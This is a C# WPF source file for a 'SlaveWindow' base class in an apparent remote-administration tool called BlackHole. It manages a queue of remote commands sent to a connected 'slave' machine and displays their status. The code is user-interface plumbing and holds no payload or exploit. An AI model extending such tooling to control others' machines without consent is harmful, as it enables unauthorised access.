using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Extentions;
using BlackHole.Master.Model;
using BlackHole.Master.Remote;

namespace BlackHole.Master
{
    public abstract class SlaveWindow : Window, IEventListener<SlaveEvent, Slave>
    {
        /// <summary>
        /// 
        /// </summary>
        public int Id { get; }

        /// <summary>
        /// 
        /// </summary>
        public Slave Slave { get; }

        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<IRemoteCommand> ViewModelCommands { get; }

        /// <summary>
        /// 
        /// </summary>
        protected Queue<IRemoteCommand> m_pendingCommands;

        /// <summary>
        /// 
        /// </summary>
        protected IRemoteCommand m_currentCommand;

        /// <summary>
        /// 
        /// </summary>
        protected Label TargetStatus;

        /// <summary>
        /// 
        /// </summary>
        protected ToolTip TargetStatusTooltip;

        /// <summary>
        /// 
        /// </summary>
        protected TextBlock TargetStatusTooltipTitle;

        /// <summary>
        /// 
        /// </summary>
        protected TextBlock TargetStatusTooltipMessage;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        protected SlaveWindow(Slave slave)
        {
            Id = GetHashCode();
            Slave = slave;
            m_pendingCommands = new Queue<IRemoteCommand>();
            ViewModelCommands = new ViewModelCollection<IRemoteCommand>();
        }

        /// <summary>
        /// 
        /// </summary>
        protected SlaveWindow() { }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public void Send(NetMessage message)
        {
            message.WindowId = Id;
            Slave.Send(message);
        }

        /// <summary>
        /// 
        /// </summary>
        public override void OnApplyTemplate()
        {
            base.OnApplyTemplate();
            FindControl<ContentPresenter>("TargetStatusPresenter", parent =>
            {
                SetContentChildContext(parent, "TargetStatusBar", Slave);
                ExecuteForContentChild<Label>(parent, "TargetStatus", lbl => TargetStatus = lbl);
                ExecuteForContentChild<ToolTip>(parent, "TargetStatusTooltip", tooltip => TargetStatusTooltip = tooltip);
                ExecuteForContentChild<TextBlock>(parent, "TargetStatusTooltipTitle", txtBlock => TargetStatusTooltipTitle = txtBlock);
                ExecuteForContentChild<TextBlock>(parent, "TargetStatusTooltipMessage", txtBlock => TargetStatusTooltipMessage = txtBlock);
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="controlName"></param>
        /// <param name="callback"></param>
        /// <returns></returns>
        protected void FindControl<T>(string controlName, Action<T> callback) where T : FrameworkElement
        {
            var control = FindName(controlName) as T;
            if (control != null)
                callback(control);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        protected void SetContentChildContext(ContentPresenter parent, string objectName, object context) =>
            ExecuteForContentChild<FrameworkElement>(parent, objectName, content => content.DataContext = context);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="parent"></param>
        /// <param name="objectName"></param>
        /// <param name="callback"></param>
        protected void ExecuteForContentChild<T>(ContentPresenter parent, string objectName, Action<T> callback)
            where T : FrameworkElement
        {
            parent.ApplyTemplate();
            var obj = parent.ContentTemplate.FindName(objectName, parent) as T;
            if (obj != null)
                callback(obj);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="parent"></param>
        /// <param name="childName"></param>
        /// <returns></returns>
        protected T FindElementByName<T>(FrameworkElement parent, string childName) where T : FrameworkElement
        {
            T childElement = null;
            var childCount = VisualTreeHelper.GetChildrenCount(parent);
            for (int i = 0; i < childCount; i++)
            {
                var child = VisualTreeHelper.GetChild(parent, i) as FrameworkElement;

                if (child == null)
                    continue;

                if (child is T && child.Name.Equals(childName))
                {
                    childElement = (T)child;
                    break;
                }

                childElement = FindElementByName<T>(child, childName);
                if (childElement != null)
                    break;
            }
            return childElement;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="listView"></param>
        /// <param name="action"></param>
        protected void ExecuteOnSelectedItems<T>(ListView listView, Action<T> action)
        {
            if (listView.SelectedItems.Count == 0)
                return;

            foreach (var item in listView.SelectedItems.OfType<T>().ToArray())
                action(item);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="command"></param>
        protected void AddCommand(IRemoteCommand command)
        {
            m_pendingCommands.Enqueue(command);
            ViewModelCommands.AddItem(command);
            ExecuteNextCommandIfPossible();
        }

        /// <summary>
        /// 
        /// </summary>
        protected void FinishCurrentCommand()
        {
            var temp = m_currentCommand;
            // we delay the remove so we see small file downloads, otherwise it would be dropped instantly (download too fast)
            Dispatcher.DelayInvoke(TimeSpan.FromMilliseconds(2000), () => ViewModelCommands.RemoveItem(temp));
            m_currentCommand = null;
            ExecuteNextCommandIfPossible();
        }

        /// <summary>
        /// 
        /// </summary>
        protected void ExecuteNextCommandIfPossible()
        {
            if (m_currentCommand != null)
                return;

            if (m_pendingCommands.Count == 0)
                return;

            m_currentCommand = m_pendingCommands.Dequeue();
            if (IsCommandCancelled(m_currentCommand.Id))
            {
                m_currentCommand = null;
                ExecuteNextCommandIfPossible();
            }
            else
            {
                m_currentCommand.DoExecute();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="TIn"></typeparam>
        /// <returns></returns>
        protected RemoteCommand<TIn> GetCommmandAs<TIn>() => m_currentCommand as RemoteCommand<TIn>;

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="TIn"></typeparam>
        /// <param name="input"></param>
        /// <param name="onUpdate"></param>
        protected void UpdateCommand<TIn>(TIn input, Action<RemoteCommand<TIn>> onUpdate)
        {
            var command = GetCommmandAs<TIn>();
            if (command == null || IsCommandCancelled(command.Id))
            {
                FinishCurrentCommand();
                return;
            }

            onUpdate(command);

            if (!command.Completed)
                command.DoContinue(input);
            else
                command.DoComplete(input);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        protected void CancelCommand(long id)
        {
            if (!IsCommandCancelled(id))
                ViewModelCommands.RemoveItem(ViewModelCommands.Items.First(command => command.Id == id));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        /// <returns></returns>
        protected bool IsCommandCancelled(long id) => !ViewModelCommands.Items.Any(command => command.Id == id);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operationId"></param>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        protected void FireSuccessStatus(long operationId, string operation, string message) =>
            FireFakeStatus(operationId, operation, true, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operationId"></param>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        protected void FireFailedStatus(long operationId, string operation, string message) =>
            FireFakeStatus(operationId, operation, false, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operationId"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        /// <param name="message"></param>
        protected void FireFakeStatus(long operationId, string operation, bool success, string message) =>
            FireSlaveEvent(SlaveEventType.IncommingMessage, new StatusUpdateMessage
            {
                WindowId = Id,
                OperationId = operationId,
                Operation = operation,
                Message = message,
                Success = success
            });

        /// <summary>
        /// 
        /// </summary>
        /// <param name="type"></param>
        /// <param name="data"></param>
        protected void FireSlaveEvent(SlaveEventType type, object data) =>
            Slave.SlaveEvents.PostEvent(new SlaveEvent(type, Slave, data));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        /// <returns></returns>
        public virtual async void OnEvent(SlaveEvent ev)
        {
            await this.ExecuteInDispatcher(() =>
            {
                switch ((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.IncommingMessage:
                    {
                        ev.Data.Match()
                            .With<StatusUpdateMessage>(m =>
                            {
                                TargetStatus.Content = m.Operation;
                                TargetStatusTooltipTitle.Text = m.Operation;
                                TargetStatusTooltipMessage.Text = m.Message;
                                TargetStatus.Foreground = m.Success ? Brushes.DarkGreen : Brushes.Red;
                                TargetStatusTooltip.PlacementTarget = TargetStatus;
                                TargetStatusTooltip.IsOpen = true;

                                if ((m_currentCommand != null) && (m.OperationId == m_currentCommand.Id) && !m.Success)
                                {
                                    m_currentCommand.ProgressColor = Brushes.DarkRed;
                                    m_currentCommand.UpdateProgression(0, 0);
                                    m_currentCommand.DoFault();
                                }
                            });
                        break;
                    }
                }
            });
        }
    }
}
